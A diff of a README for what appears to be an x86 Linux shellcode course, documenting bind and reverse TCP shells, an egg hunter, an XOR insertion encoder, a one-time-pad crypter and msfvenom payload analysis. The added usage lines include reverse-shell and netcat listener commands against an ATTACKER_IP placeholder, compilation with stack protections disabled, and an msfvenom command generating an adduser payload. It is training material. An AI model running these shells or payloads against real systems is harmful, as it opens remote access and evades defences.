@@ -9,9 +9,12 @@ Create a Shell Bind TCP Shellcode
 - Port number should be easily configurable
 ```
 Implemeted the TCP Bind Shell shellcode 
-Usage example: ./bind_shell <PORT>
+Usage : 
 
-In Victim Machine => ./bindshell 9999 
+=> gcc shellcode_with_configurable_port.c -zexecstack -fno-stack-protector -o bind_shell
+=> ./bind_shell <PORT_TO_BIND>
+
+Victim Machine => ./bind_shell 9999 
 
 Attacker Machine => nc 127.0.0.1 9999
 
@@ -24,27 +27,56 @@ Create a Shell Reverse Tcp Shellcode
 - IP and Port should be easily configurable
 ```
 Implemeted the TCP Reverse Shell shellcode 
-Usage example : ./reverse_shell <ATTACKER_IP> <PORT>
+Usage : 
+
+=> gcc shellcode_with_configurable_port.c -zexecstack -fno-stack-protector -o reverse_shell
+=> ./reverse_shell <ATTACKER_IP TO CONNECT> <ATTACKER_PORT_TO_CONNECT>
 
 Attacker Machine => nc -nlvp 8888
 
-In Victim Machine => ./reverse_shell 127.0.0.1 8888  
+Victim Machine => ./reverse_shell 127.0.0.1 8888  
 
 Blog : https://oxhat.blogspot.com/2018/04/coding-custom-tcp-reverse-shell.html
 ```
 ### Assignment 3
 Study about Egg Hunter Shellcode
-Create a working demo of the Egg Hunter
-Should be configurable for different payload
+- Create a working demo of the Egg Hunter
+- Should be configurable for different payload
+```
+Usage: 
 
+Open the  egghunter_c_wrapper.c and put the any shellcode in the shellcode array location
+=> gcc egghunter_c_wrapper.c -o egghunter_c_wrapper.o -zexecstack -fno-stack-protector
+=> ./egghunter_c_wrapper.o
+
+Blog : https://oxhat.blogspot.com/2019/04/egg-hunter-shellcode.html
+       https://oxhat.blogspot.com/2018/04/why-do-we-need-egg-hunters.html
+```
 ### Assignment 4
 Create a custom encoding scheme  like "Insertion Encoder" we showed you
-Poc using execve-stack as the shellcode to encode your schema and execute
+- Poc using execve-stack as the shellcode to encode your schema and execute
+```
+Implemented a custom encoder where each shellcode value is xored and duplicated to generate the final shellcode
+Implemented a custom decoder to decode the encoded shellcode
 
+Usage:
+generating encoded shellcode 
+
+Put the shellcode inside the custom_insertion_encoder.py
+=> python custom_insertion_encoder.py
+
+decoding and executing
+copy and put the encoded shellcode inside the nasm file
+=> nasm custom_insertion_decoder.nasm -felf32 -o custom_insertion_decoder.o
+=> ld custom_insertion_decoder.o -o custom_insertion_decoder
+=> ./custom_insertion_decoder
+
+Blog : https://oxhat.blogspot.com/2019/04/coding-custom-insertion-encoder-and.html
+```
 ### Assignment 5
 Take up at least 3 shellcode sample created using Msfpayload for linux/x86
-Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode
-Present your analysis
+- Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode
+- Present your analysis
 ```
 As msfpayload is outdate, all the payloads are created using msfvenom
 
@@ -53,6 +85,16 @@ As msfpayload is outdate, all the payloads are created using msfvenom
 2. Analysis of linux/x86/chmod shellcode
 
 3. Analysis of linux/x86/exec shellcode
+
+Usage:
+
+Shellcode Generation:
+=> msfvenom --platform linux --arch x86 --payload linux/x86/adduser USER=slae PASS=slaeslae -i0 -f hex
+
+Shellcode Analysis
+=> echo -ne "Some shellcode \xaa\xbb" | ndisasm -u -
+=> echo -ne "Some shellcode \xaa\xbb" | /opt/libemu/bin/sctest -vvv -Ss 10000 -G image.dot
+=> dot image.dot -Tpng -o image.png
 
 Blog : https://oxhat.blogspot.com/2019/04/analyzing-shellcode.html
 ```
@@ -76,6 +118,15 @@ Create a custom crypter like the one shown in "crypters" video.
 ```
 1. Implemented a crypter with encrytion based on one time pad.
 
+Usage:
+
+put the shellcode and passcode in genkey.py
+=> python genkey.py
+Copy the key
+copy the encrypted shellcode in the shellcode array in assignment7.c
+=> gcc assignment7.c -o crypter -zexecstack -fno-stack-protector
+=> ./crypter <KEY>
+
 Blog : https://oxhat.blogspot.com/2019/04/coding-custom-crypter.html 
 ```
 ### Additional Assignments
@@ -85,10 +136,14 @@ Blog : https://oxhat.blogspot.com/2019/04/coding-custom-crypter.html
 ### Scripts
 ```
 1. Implmented a bash automation script to generate shellcode from binary
-usage: dump.sh binary
+usage: 
+
+=>dump.sh binary
 There is also an extended version of this inside the same directory.
 Sometimes the script does not dump all the shellcode properly so the extended version is used.
 
 2. Implemented an automation script to generate a C code with an embedded shellcode inside it.
-usage : python shellcode_template.py filename.c "\x41\x41\x41x\41"
+usage :
+
+=>python shellcode_template.py filename.c "\x41\x41\x41x\41"
 ```
